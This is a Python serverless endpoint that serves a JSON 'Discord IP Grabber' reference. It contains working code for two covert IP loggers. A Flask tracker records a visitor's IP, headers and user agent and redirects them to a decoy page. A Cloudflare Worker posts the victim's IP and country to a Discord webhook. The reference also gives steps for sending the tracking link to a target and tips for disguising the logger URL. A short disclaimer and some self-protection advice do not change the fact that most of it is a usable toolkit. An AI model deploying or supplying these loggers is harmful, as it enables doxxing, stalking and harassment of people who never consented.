from http.server import BaseHTTPRequestHandler
import json

INFO = {
    "tool": "Discord IP Grabber — Reference",
    "disclaimer": "Technical reference only. Grabbing someone's IP without consent is illegal in most jurisdictions. This endpoint explains how link-based IP logging works for defensive/educational purposes.",
    "how_link_loggers_work": [
        "1. Create a server that logs every HTTP request's remote IP + User-Agent + headers",
        "2. Generate a short tracking URL pointing to your server",
        "3. Send the URL to the target (Discord message, DM, embed, etc.)",
        "4. When they click, their browser reveals their IP to your server",
        "5. Common disguises: Ricembed, Grabify, IPLogger, Canarytokens"
    ],
    "self_host_snippet": """# Minimal Flask IP logger (self-hosted, educational only)
from flask import Flask, request
import json, datetime

app = Flask(__name__)

@app.route("/track/<token>")
def track(token):
    log = {
        "token": token,
        "ip": request.remote_addr,
        "x_forwarded_for": request.headers.get("X-Forwarded-For"),
        "user_agent": request.user_agent.string,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "headers": dict(request.headers),
    }
    with open("hits.jsonl", "a") as f:
        f.write(json.dumps(log) + "\\n")
    # Redirect to innocent-looking page
    return '', 302, {'Location': 'https://example.com'}

app.run(host="0.0.0.0", port=8080)
""",
    "vercel_webhook_variant": """# POST to Discord webhook with IP info using Cloudflare Workers
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const ip = request.headers.get('CF-Connecting-IP')
  const ua = request.headers.get('User-Agent')
  const country = request.headers.get('CF-IPCountry')
  
  // Send to Discord webhook
  await fetch('https://discord.com/api/webhooks/ID/TOKEN', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      content: `IP: ${ip}\\nCountry: ${country}\\nUA: ${ua}`
    })
  })
  
  // Redirect target to innocent page
  return Response.redirect('https://discord.com', 302)
}
""",
    "detection_avoidance": [
        "Discord embeds URLs automatically — use a redirect proxy to hide the logger URL",
        "Discord's own CDN proxy (media.discordapp.net) may strip IP if image is cached",
        "VPN/proxy users will show datacenter IP, not real IP"
    ],
    "how_to_protect_yourself": [
        "Use a VPN or Tor before clicking suspicious links",
        "Disable link previews in Discord settings",
        "Use uBlock Origin + Privacy Badger to block trackers",
        "Hover links before clicking — Grabify URLs often contain 'grabify.link', 'iplogger.org', 'ipgrab.me'"
    ],
    "public_ip_logger_services": ["Grabify.link", "IPLogger.org", "Canarytokens.org", "interact.sh (open source)"]
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(INFO, indent=2).encode())

    def log_message(self, *a): pass
